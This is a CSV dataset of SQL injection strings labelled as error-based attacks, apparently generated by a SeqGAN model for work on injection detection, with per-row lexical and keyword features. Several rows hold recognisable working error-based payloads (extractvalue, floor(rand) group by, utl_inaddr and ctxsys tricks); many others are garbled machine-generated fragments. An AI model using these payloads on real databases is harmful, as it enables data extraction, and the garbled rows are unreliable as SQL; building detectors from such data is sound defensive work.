label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '   nada f  (  (  (  (  ||r  (  SELECT Le (  6055,0x717a767a71  0 information_schema  ||chs  (  rand  select   fromuna' like 'r2 ,ANTNCT  (  (  =  ~  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401,484.0,52.0,4.0990299001293,167.0,70.0,186.0,61.0,0.3450413223140496,0.1446280991735537,0.384297520661157,0.12603305785123967,4.0,0.0,2.0,0.0,2.0,2.0,0.0,35.0,1.0,1.0,8.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,1'||  (  select '_er.gsw_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402,25.0,15.0,3.6692750707107136,11.0,1.0,5.0,8.0,0.44,0.04,0.2,0.32,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's5606   =  4493   or 4493  (  select or else or else and when (  select 1 x union 1 du,concat  0x4b774c75 AND 1 else AINUMIIadr_rNsalets  select or 113  cases : union 78811'||  (  select ' = LAINMs.chr union 0x717a767a71,  rand  >  (7469  (  ||select sjd.selectns   case  DLIESFROM unionxu   thenunion 3931  union 6082 unionOW.Ech",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403,509.0,52.0,4.400056311855651,221.0,86.0,157.0,45.0,0.43418467583497056,0.16895874263261296,0.30844793713163066,0.08840864440078586,4.0,0.0,0.0,0.0,0.0,3.0,0.0,21.0,0.0,1.0,7.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,4.0,0.0,0.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '"" like ""bdrwIb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404,343.0,36.0,3.7147445707848257,102.0,45.0,138.0,58.0,0.29737609329446063,0.13119533527696792,0.40233236151603496,0.16909620991253643,2.0,2.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"",hr  (  ||chr  (  0  || G select2   (  ||chrIhpr.sadr.s.aaadsNi.(  )    ,select   (  #.5305    )   or  else   e 0ITINend",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405,122.0,30.0,3.9272308772362488,51.0,8.0,41.0,22.0,0.4180327868852459,0.06557377049180328,0.3360655737704918,0.18032786885245902,0.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,2.0,6.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-uconcata6236'  =  'zvT orexowes s A when   SELECT by unionselect when    )  )2   thenc select 1 union 1 or by WHERE  from select * else when  113  3326,i'+  (  select ' FROM union union by AND else concat  select from 7158  ||chr  (    case when union  1 hr  (  =  )    (  )     (  select by m end  4232,  )     )     )  )    n    from x  from(  6825  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406,358.0,53.0,4.2473770236417545,181.0,27.0,123.0,27.0,0.505586592178771,0.07541899441340782,0.3435754189944134,0.07541899441340782,4.0,0.0,1.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,2.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,6.0,4.0,1.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1'||  (  select '' like ''  =  'yg.w'  =  'laxa6270vweelaaduinaal_aj_owepre   (emhtr  (  )  select FROM  =  )   a concat  =  0 from else or    else 0 end  ||ch  (  chrhr  (  0x7171706a71   (  ||cr  rand  0  4232  --2  --prta '+  (  select '  113  113  )     )   :c  122   then)   AND else concat  (  (  )  (  ||,hr  (  (  select 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407,330.0,49.0,4.131990667628017,129.0,33.0,118.0,50.0,0.39090909090909093,0.1,0.3575757575757576,0.15151515151515152,10.0,0.0,4.0,0.0,0.0,4.0,0.0,18.0,0.0,2.0,1.0,17.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%%""  =  ""8844floor  122  t  I     )   or FROM 1 or from(  =  )  ,0x717a767a71,from then select 1   x DSIN3931TNSAMINT  a how  w  n  )     )   v when   ua' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'aabs.   x,7562  #vn  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408,357.0,50.0,4.2447738155688,115.0,73.0,128.0,41.0,0.32212885154061627,0.20448179271708683,0.3585434173669468,0.11484593837535013,2.0,2.0,0.0,0.0,0.0,4.0,0.0,17.0,2.0,0.0,9.0,6.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,4.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409,205.0,30.0,3.805554440253599,70.0,37.0,76.0,22.0,0.34146341463414637,0.18048780487804877,0.37073170731707317,0.1073170731707317,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-"" like ""20170x717a767a715000000)     rand  )    )  )   then 0 0 mcx.untale   113  4232  #a_,floor  rand  ||r  (   )       ||chr  (  )  )  0  *   )    and ROM xT from group end  ||osead.gstseobar,t  (  122  ,  caseAND information_schemauf  ,  ||a  (  6  )     6237   then when else 0 || a DIISN6055  =  select x x Tch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410,317.0,50.0,4.325440793157412,129.0,43.0,108.0,37.0,0.4069400630914827,0.13564668769716087,0.34069400630914826,0.1167192429022082,0.0,2.0,1.0,0.0,1.0,1.0,0.0,13.0,0.0,2.0,4.0,13.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""0x4b774c75bzB3074ui9740:asyst_ntzqs   )    nas   havingLIT  (  rand  || Wo  1045,concat0x717a767a71  113  9067concatu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411,674.0,50.0,4.039048891253399,212.0,116.0,255.0,91.0,0.314540059347181,0.17210682492581603,0.37833827893175076,0.13501483679525222,0.0,4.0,0.0,0.0,0.0,3.0,0.0,48.0,2.0,4.0,6.0,25.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'Reselect 4493  (  (  ||cr  (  =  select   )    )    )   or 1 having DI G'i' from  ||chr  (  (  ||c LRinformation_schemar.gresint  (  1297  select  4386  (  ||chr  csoxs  (  (  >  ut  =  4493am when   INCT  *(   0x78  in,  ,concat  select 'i'  (  *        (  ||chr  (  (  || AND  by m information_schemaz.E  SELECT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412,644.0,56.0,4.16622861716596,240.0,74.0,247.0,83.0,0.37267080745341613,0.11490683229813664,0.38354037267080743,0.12888198757763975,6.0,0.0,1.0,0.0,4.0,3.0,0.0,43.0,0.0,2.0,8.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,21.0
attack,"1%""  =  ""j""  =  ""bleuatzq,""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""rOconcat  chr  (  =  =u   concat  =  (  em>  113  ||roualt  (  )  4232,1   )    )   ( from   (  0   )    )     )   x   WHERE 1 DIMs group D 1 0p end   where  1 0      ,10x717a767a71#     or co.(  113  0x7171706a71   ,floor  (  4386  ||chr  (  (  =  )     4232  4232  )     ||  113  * 5305   ,  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413,616.0,55.0,3.938453519253182,185.0,91.0,260.0,80.0,0.3003246753246753,0.14772727272727273,0.42207792207792205,0.12987012987012986,0.0,6.0,0.0,0.0,3.0,7.0,0.0,41.0,1.0,2.0,10.0,17.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,2.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"""ada where 1t_  (  6237  SELECT by x  FROMauit union 1 (  >        FROM   1 3931chruaCna  (  (  5023  4232  ,i  *2having   me 8488 select 0 when  )     select )    select 1 6825 1210  thenend   (   then concatconcat  (  )  )  ,a   )   SELECT union RDINNNASwhereIST union 1210  )    select || 1x  0x4b774c75l DSTINSC.T  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415,323.0,53.0,4.512513766203065,151.0,48.0,103.0,21.0,0.4674922600619195,0.14860681114551083,0.3188854489164087,0.06501547987616099,0.0,1.0,0.0,0.0,1.0,0.0,0.0,12.0,0.0,1.0,2.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,6.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,-M5023  having ) information_schemauinialtnwt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416,45.0,26.0,4.381316019639962,34.0,4.0,4.0,3.0,0.7555555555555555,0.08888888888888889,0.08888888888888889,0.06666666666666667,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'zc_sju",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417,303.0,40.0,4.036869006559383,106.0,55.0,109.0,33.0,0.34983498349834985,0.18151815181518152,0.35973597359735976,0.10891089108910891,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,1.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"17319xx NAONC"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""E0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418,353.0,40.0,3.8305498767842865,102.0,58.0,137.0,56.0,0.28895184135977336,0.1643059490084986,0.3881019830028329,0.15864022662889518,0.0,2.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""4510hx.R=ljhrcfloorounq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419,576.0,41.0,3.837523604930763,170.0,89.0,232.0,85.0,0.2951388888888889,0.1545138888888889,0.4027777777777778,0.14756944444444445,0.0,4.0,0.0,0.0,0.0,4.0,0.0,46.0,2.0,0.0,6.0,24.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1 union' like 'UNTGANCT 5192a0x717a767a71x DINUT Sunionselect 8488 union 4493  ,0x717a767a71,0x78   SELECTE(  select from  dy  addrt_os 0)   FROM   (  case,7469   where 1- E  ||cr  *rr  (  ,  0 6825chr  (  =  )   )    )  having   )    )  (  )   from         from  union or xT select  rand  ||ch  (  a_'  =  'agaTr7810 || information_schemar.tre",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420,344.0,57.0,4.623567255529276,157.0,49.0,103.0,35.0,0.4563953488372093,0.14244186046511628,0.29941860465116277,0.10174418604651163,4.0,0.0,1.0,0.0,1.0,2.0,0.0,13.0,0.0,3.0,4.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,3.0,1.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-rand  *   ,  >  118  )      and      )  5023  )  3440  4386  ||c  )    )     )   )    2 or  1 x AISTIT  (   select end  (  ,1   then byui 5023  )     ,  case 0 DEI.cfTNE  ||  end  ) l  )     )    )   thenc  ,0x717a767a71,  when   and FROM chr  (  9173,  )  select a 1 else 0 5192 T 3785 or when union(  case concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421,317.0,48.0,3.9078333339198057,105.0,46.0,135.0,31.0,0.3312302839116719,0.14511041009463724,0.42586750788643535,0.09779179810725552,0.0,0.0,1.0,0.0,1.0,0.0,0.0,17.0,0.0,0.0,6.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"gun(,  ||  (  ,  casem  =  ||chr  (  select 5584  1  (  )  select 1 concat  )  f  case)   (  )  )  ()   ,concat   information_schema.  =  =  )   (  chrrvhtr   information_schema union,  aunax.choj.tbyss   8382unb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422,212.0,34.0,4.068073434894666,104.0,10.0,68.0,30.0,0.49056603773584906,0.04716981132075472,0.32075471698113206,0.14150943396226415,0.0,0.0,0.0,0.0,0.0,3.0,0.0,14.0,0.0,2.0,4.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423,235.0,34.0,3.941845153574428,81.0,45.0,83.0,26.0,0.3446808510638298,0.19148936170212766,0.35319148936170214,0.11063829787234042,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,1.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""%"" like ""cchoowu4106  ||r  (  113,0x717a767a71       ),  select   --,floor  ||c_adrlar.g   x.  (  (  0  )    then 0 1 else by 1392 or FROM   (  (  ||chr  (  (  select from 4386  auau   )  ,concat  6055  = and 1 x concat  )   then 1 information_schema  *2 or union (  ||c    =  *2   ,0x717a767a71,  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424,305.0,47.0,4.318484755581568,116.0,45.0,101.0,43.0,0.380327868852459,0.14754098360655737,0.33114754098360655,0.14098360655737704,0.0,3.0,4.0,0.0,2.0,2.0,0.0,13.0,1.0,2.0,6.0,16.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '4822I.g 1(  2 else m, SIrNRounuestdr.(  (  ||ychrhr  (  ,0x717a767a71  ||chr  (  select when   (  ,n information_schema  0 0x717a767a71,floor  t  (  case LL' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'M else byx INSNCntr_rosad.ua  (  case RT 1 by a x 0 end  from or or by concat  0  )    ,concat  (concat  6055  ||  (  (  *,floor  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425,765.0,51.0,4.17144996526152,286.0,121.0,271.0,87.0,0.3738562091503268,0.15816993464052287,0.3542483660130719,0.11372549019607843,4.0,0.0,0.0,0.0,3.0,3.0,0.0,48.0,0.0,2.0,17.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,0.0,2.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
